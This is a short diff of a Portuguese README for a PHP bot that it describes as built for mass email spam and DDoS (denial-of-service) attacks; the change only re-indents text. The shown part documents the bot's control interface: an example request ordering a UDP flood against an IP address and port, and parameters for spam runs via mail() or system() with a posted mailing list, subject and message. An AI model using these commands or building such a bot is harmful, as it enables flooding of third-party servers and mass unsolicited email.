@@ -14,12 +14,12 @@ Bot em PHP utilizado para enviar emails em massa e realizar ataques DDoS (Negaç
      phpBot.php?hash=admin&command=ddos&flag=udp&data=111.111.111.111:22
      
  - Spam:
-     command = spam, phpspam (spam via mail() function).
-     flag = 1 é padrão para spam normal. 
-            Para phpspam, 1 = Usa função system() para rodar enviador, 
-            2 = Utiliza todas as funções (Envia repetido).
-     data = null (default).
-     
+       command = spam, phpspam (spam via mail() function).
+       flag = 1 é padrão para spam normal. 
+              Para phpspam, 1 = Usa função system() para rodar enviador, 
+              2 = Utiliza todas as funções (Envia repetido).
+       data = null (default).
+       
       POST data:
         maillist=...&subject=...&from=...&message=...
        
